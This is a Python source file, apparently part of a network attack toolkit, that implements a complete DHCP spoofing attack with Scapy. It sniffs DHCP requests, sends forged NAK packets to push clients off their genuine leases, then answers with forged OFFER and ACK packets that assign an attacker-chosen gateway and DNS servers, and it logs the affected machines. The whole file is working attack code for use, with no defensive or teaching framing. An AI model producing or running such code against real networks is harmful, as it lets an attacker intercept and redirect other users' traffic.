from scapy.all import *
import threading
import time
import logging
import random
from utils import print_status, validate_ip, enable_ip_forwarding
import config
import socket
import struct
import signal
import sys
from datetime import datetime

class DHCPSpoofer:
    def __init__(self, spoofed_ip, spoofed_gw, dns_servers, lease_time, subnet_mask, interface=None):
        self.spoofed_ip = spoofed_ip
        self.spoofed_gw = spoofed_gw
        self.dns_servers = dns_servers if isinstance(dns_servers, list) else dns_servers.split(',')
        self.lease_time = lease_time
        self.subnet_mask = subnet_mask
        self.interface = interface or conf.iface
        self.clients = {}  # Track clients and their leases
        self.running = False
        self.stop_event = threading.Event()
        
        # Set up logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        self.logger.info(f"Initializing DHCP spoofer on interface {self.interface}")
        self.logger.info(f"Will assign IP: {self.spoofed_ip}, Gateway: {self.spoofed_gw}")
        self.logger.info(f"DNS servers: {', '.join(self.dns_servers)}")
        self.logger.info(f"Subnet mask: {self.subnet_mask}, Lease time: {self.lease_time} seconds")

    def create_dhcp_nak(self, pkt):
        """Create a DHCP NAK packet to force client to release its current lease"""
        nak = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
              IP(src=self.spoofed_gw, dst="255.255.255.255") / \
              UDP(sport=67, dport=68) / \
              BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
              DHCP(options=[("message-type", "nak"),
                           ("server_id", self.spoofed_gw),
                           "end"])
        return nak

    def create_dhcp_offer(self, pkt):
        """Create a DHCP OFFER packet"""
        offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
                IP(src=self.spoofed_gw, dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
                DHCP(options=[("message-type", "offer"),
                             ("server_id", self.spoofed_gw),
                             ("lease_time", self.lease_time),
                             ("subnet_mask", self.subnet_mask),
                             ("router", self.spoofed_gw)] + \
                            [("name_server", dns) for dns in self.dns_servers] + \
                            [("end")])
        return offer

    def create_dhcp_ack(self, pkt):
        """Create a DHCP ACK packet"""
        ack = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
              IP(src=self.spoofed_gw, dst="255.255.255.255") / \
              UDP(sport=67, dport=68) / \
              BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
              DHCP(options=[("message-type", "ack"),
                           ("server_id", self.spoofed_gw),
                           ("lease_time", self.lease_time),
                           ("subnet_mask", self.subnet_mask),
                           ("router", self.spoofed_gw)] + \
                          [("name_server", dns) for dns in self.dns_servers] + \
                          [("end")])
        return ack

    def handle_dhcp_packet(self, pkt):
        """Handle incoming DHCP packets"""
        if not pkt.haslayer(DHCP):
            return

        mac = pkt[Ether].src
        dhcp_options = pkt[DHCP].options
        message_type = None

        for option in dhcp_options:
            if option[0] == "message-type":
                message_type = option[1]
                break

        if message_type == 1:  # DHCP DISCOVER
            self.logger.info(f"Received DHCP DISCOVER from {mac}")
            # First send NAK to force release of current lease
            nak = self.create_dhcp_nak(pkt)
            sendp(nak, iface=self.interface, verbose=False)
            self.logger.info(f"Sent DHCP NAK to {mac}")
            
            # Then send our offer
            offer = self.create_dhcp_offer(pkt)
            sendp(offer, iface=self.interface, verbose=False)
            self.logger.info(f"Sent DHCP OFFER to {mac} with IP {self.spoofed_ip}")
            
            # Track client
            if mac not in self.clients:
                self.clients[mac] = {
                    'ip': self.spoofed_ip,
                    'status': 'offered',
                    'start_time': datetime.now()
                }

        elif message_type == 3:  # DHCP REQUEST
            self.logger.info(f"Received DHCP REQUEST from {mac}")
            ack = self.create_dhcp_ack(pkt)
            sendp(ack, iface=self.interface, verbose=False)
            self.logger.info(f"Sent DHCP ACK to {mac} with IP {self.spoofed_ip}")
            
            # Update client status
            if mac in self.clients:
                self.clients[mac]['status'] = 'bound'
            else:
                self.clients[mac] = {
                    'ip': self.spoofed_ip,
                    'status': 'bound',
                    'start_time': datetime.now()
                }

        # Print current clients
        self.print_clients()

    def print_clients(self):
        """Print information about current clients"""
        if not self.clients:
            self.logger.info("No clients currently connected")
            return

        self.logger.info("\nCurrent Clients:")
        self.logger.info("MAC Address\t\tIP Address\tStatus\t\tDuration")
        self.logger.info("-" * 60)
        
        for mac, info in self.clients.items():
            duration = datetime.now() - info['start_time']
            self.logger.info(f"{mac}\t{info['ip']}\t{info['status']}\t\t{duration}")

    def start(self):
        """Start the DHCP spoofing attack"""
        self.running = True
        self.logger.info("Starting DHCP spoofing attack...")
        
        # Start sniffing in a separate thread
        self.sniff_thread = threading.Thread(target=self._run)
        self.sniff_thread.daemon = True
        self.sniff_thread.start()

    def _run(self):
        """Main sniffing loop"""
        try:
            sniff(filter="udp and (port 67 or port 68)",
                  prn=self.handle_dhcp_packet,
                  iface=self.interface,
                  stop_filter=lambda p: self.stop_event.is_set())
        except Exception as e:
            self.logger.error(f"Error in sniffing thread: {str(e)}")
        finally:
            self.running = False

    def stop(self):
        """Stop the DHCP spoofing attack"""
        self.logger.info("Stopping DHCP spoofing attack...")
        self.stop_event.set()
        
        # Wait for sniffing thread to stop
        if hasattr(self, 'sniff_thread'):
            self.sniff_thread.join(timeout=2)
        
        # Print final client status
        if self.clients:
            self.logger.info("\nFinal Client Status:")
            self.logger.info("MAC Address\t\tIP Address\tStatus\t\tDuration")
            self.logger.info("-" * 60)
            for mac, info in self.clients.items():
                duration = datetime.now() - info['start_time']
                self.logger.info(f"{mac}\t{info['ip']}\t{info['status']}\t\t{duration}")
        else:
            self.logger.info("No clients were affected by the attack")
        
        self.logger.info("DHCP spoofing attack stopped")

def run_attack(spoofed_ip, spoofed_gw, dns_servers=None, lease_time=43200, subnet_mask="255.255.255.0", interface=None):
    """Run the DHCP spoofing attack."""
    spoofer = None
    
    def signal_handler(sig, frame):
        print_status("\nStopping attack...", "warning")
        if spoofer:
            spoofer.stop()
        sys.exit(0)
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        spoofer = DHCPSpoofer(spoofed_ip, spoofed_gw, dns_servers, lease_time, subnet_mask, interface)
        spoofer.start()
        
        print_status("Press Ctrl+C to stop the attack", "info")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_status("\nStopping attack...", "warning")
    except Exception as e:
        print_status(f"Error: {e}", "error")
    finally:
        if spoofer:
            spoofer.stop()

if __name__ == "__main__":
    run_attack("192.168.158.133", "192.168.158.1") 